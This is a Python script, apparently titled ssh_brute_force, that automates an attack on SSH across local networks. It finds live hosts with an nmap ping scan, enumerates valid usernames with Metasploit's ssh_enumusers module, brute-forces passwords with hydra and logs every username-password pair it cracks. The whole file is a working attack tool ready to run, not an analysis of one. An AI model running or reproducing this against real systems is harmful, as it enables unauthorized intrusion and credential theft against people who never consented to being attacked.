import argparse
import random
import socket
import time
from typing import Literal, Optional
import nmap
import subprocess as sp
import pymetasploit3
from pymetasploit3.msfrpc import MsfRpcClient


class Daemon:
    def __init__(self, process: sp.Popen = None):
        self.daemon = process


def get_valid_users(metasploit_output):
    """Extracts the usernames found by metasploit. If metasploit did not find any usernames then it populates valid_users.txt with default values"""

    output_lines = metasploit_output.splitlines()
    # we consider only the lines which have two 's (those which contain the usernames)
    name_lines = [line for line in output_lines if line.count("'") == 2]
    usernames = []

    for name_line in name_lines:
        # we extract the name from those lines
        split_line = name_line.split("'")
        usernames.append(split_line[1])

    if usernames:
        # if we found something we create a file containing what we found
        with open('valid_users.txt', 'w') as file:
            for name in usernames:
                file.write(name + '\n')

    else:
        # else we populate the file we default values
        with open('valid_users.txt', 'w') as file:
            file.write('ope\n')
            file.write('clo\n')


def get_user_password_pair(hydra_output):
    """Extracts the password-username pair found by hydra"""

    output_lines = hydra_output.splitlines()

    # we only consider the lines containing the results
    password_lines = [line for line in output_lines if 'password: ' in line]

    # we then build a dictionary with usernames as its keys and passwords as its values
    pass_dict = {}

    for line in password_lines:
        # we ignore the first part of the line
        line = line[11:len(line)]

        # we split the line in three parts: 'host', 'login' and 'password'
        split_line = line.split()

        # we split those parts another time to get the results which we then add to the dict
        pass_dict[split_line[3]] = split_line[5]

    return pass_dict


def main(target_every_machines: bool, daemon: Daemon, attack_type: Literal["t", "m"] = "m",
         preferred_host: Optional[str] = None):
    print('\nnew session\n')
    with open('./out.log', 'a') as log:
        log.write('\nnew session\n')

    # we explore the topology of the network using nmap's ping scan option

    host_settings = "192.168.1.0/24;192.168.0.0/24;10.0.0.0/24"
    host_settings_list = host_settings.split(';')
    outs = [[]] * 3

    # using the nmap library we can run nmap commands on python
    nmp = nmap.PortScanner()
    print('running host discovery...')
    # we scan the network with the given host settings to find the possible target
    for i in range(3):
        print('host settings: ' + host_settings_list[i])
        # we do a host discovery with the given options
        nmp.scan(hosts=host_settings_list[i], arguments='-T5 -sP')
        # we add the host's ip to 'result' if it's connected to the network
        result = [x for x in nmp.all_hosts() if nmp[x] and nmp[x]['status']['state'] == 'up']
        print('results:')
        # we print the hosts we found
        if result:
            with open('./out.log', 'a') as log:
                log.write('results:\n')
                for host in result:
                    print(host)
                    log.write(host + '\n')
        else:
            print('-')
        # we save the result of the command in the 'results' list

        outs[i] = result

    # if we have found any machine connected to the network, we set it as our target
    targets = []
    for i in range(len(host_settings_list)):
        if outs[i]:
            targets = targets + outs[i]
            break

    # we avoid brute-forcing ourselves
    if "10.0.0.2" in targets:
        targets.remove("10.0.0.2")

    # depending on the target_every_machine bool we try to crack the passwords for every running host or not
    if targets:
        if target_every_machines:
            crack_ssh_password(targets, attack_type, daemon)
        else:
            if preferred_host and preferred_host in targets:
                crack_ssh_password([preferred_host], attack_type, daemon)
            else:
                crack_ssh_password([random.choice(targets)], attack_type, daemon)
    else:
        print("No targets found")


def crack_ssh_password(targets, attack_type, daemon):
    if attack_type == 't':
        action = 'Timing Attack'
        print("Using timing attack...")
    elif attack_type == 'm':
        action = 'Malformed Packet'
        print("Using malformed packet...")
    else:
        print("Action not supported, switching to Malformed Packet")
        action = 'Malformed Packet'

    # we print the target/targets
    print('targets:')
    with open('./out.log', 'a') as log:
        log.write('targets:\n')
        for target in targets:
            print(target)
            log.write(target + '\n')

    for target in targets:
        try:
            # we use metasploit to find the name of the user on the targeted machines
            # we fist try to connect to the rpc service. if this fails, we run the msfrpcd command which creates a process to manage the rpc service for the metasploit framework, and then create a connection to it.
            client = MsfRpcClient('10000', ssl=True)
        except socket.error as err1:
            print(f"Socket error occurred: {err1}")
            print("Trying to start a new msfrpc deamon...")
            # we use the subprocess module to execute the command on the background without waiting for its results
            daemon.daemon = sp.Popen(f'msfrpcd -P 10000', shell=True)
            # we wait 3 seconds before trying to connect to the rpc server
            print('waiting for the rpc server to open up...')
            for i in range(30):
                print(f'{i + 1}...')
                time.sleep(1)
            client = MsfRpcClient('10000', ssl=True)
        except Exception as err2:
            print(f"unexpected error: {err2}")
            if daemon.daemon:
                daemon.daemon.terminate()
            return

        # we set the module, the target of the attack, the usernames to test with etc...
        auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_enumusers')
        auxiliary['RHOSTS'] = target
        auxiliary['USER_FILE'] = 'namelist.txt'
        auxiliary['CHECK_FALSE'] = True
        auxiliary['THREADS'] = 25
        auxiliary.runoptions['ACTION'] = action

        # we run the exploit to get the username of targeted machine
        print('running selected metasploit module...', flush=True)
        output = client.consoles.console().run_module_with_output(auxiliary, timeout=1000)
        # show the results and then process the data
        print(output, flush=True)
        with open('./out.log', 'a') as log:
            log.write(output)
        get_valid_users(output)

        # we then proceed in trying to crack the password using hydra
        print(f'running hydra to crack password in {target}...', flush=True)
        subprocess = sp.Popen('hydra -L valid_users.txt -P less_passwords.txt ssh://' + target, stdout=sp.PIPE,
                              stderr=sp.PIPE,
                              shell=True, text=True)
        # we print the results and process the data
        outs, errs = subprocess.communicate(timeout=10000)
        with open('./out.log', 'a') as log:
            if outs:
                # we process that data, so we can show the user-password pairs we found
                print(outs)
                log.write(outs)
                p_dict = get_user_password_pair(outs)
                print('valid user-password pairs: ')
                log.write('valid user-password pairs:\n')
                for user in p_dict.keys():
                    print(user + ' - ' + p_dict[user])
                    log.write(user + ' - ' + p_dict[user] + '\n')
            else:
                print(errs)
                log.write(errs)
        client.logout()
    if daemon.daemon:
        daemon.daemon.terminate()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog="ssh_brute_force",
                                     description="does a brute force of the active hosts on the network with the given usernames and passwords in less_password.txt and usernames.txt files in the same directory")
    parser.add_argument('-d', '--distributed', action='store_true', dest='distributed',
                        help='specifies if attack is distributed or not')
    parser.add_argument('-nd', '--no-distributed', action='store_false', dest='distributed',
                        help='specifies if attack is distributed or not')
    parser.add_argument('-a', '--action', type=str, default='m',
                        help='specifies the type of exploit to use when listing the valid ssh accounts')
    parser.add_argument('--host', type=str, help='preferred host to target')
    args = parser.parse_args()
    daemon = Daemon()
    try:
        main(args.distributed, daemon, args.action, args.host)
    except KeyboardInterrupt:
        if daemon.daemon:
            daemon.daemon.terminate()
